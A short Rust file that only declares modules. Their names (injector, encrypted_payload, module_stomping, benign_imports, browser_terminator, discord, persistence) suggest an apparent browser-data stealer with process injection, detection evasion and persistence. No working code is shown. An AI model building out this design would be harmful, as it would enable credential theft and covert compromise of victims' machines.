pub mod browser_discovery;
pub mod browser_terminator;
pub mod process_manager;
pub mod pipe_server;
pub mod injector;
pub mod encrypted_payload;
pub mod module_stomping;
pub mod benign_imports;

pub use browser_discovery::{BrowserInfo, BrowserDiscovery};

pub mod discord;
pub mod persistence;
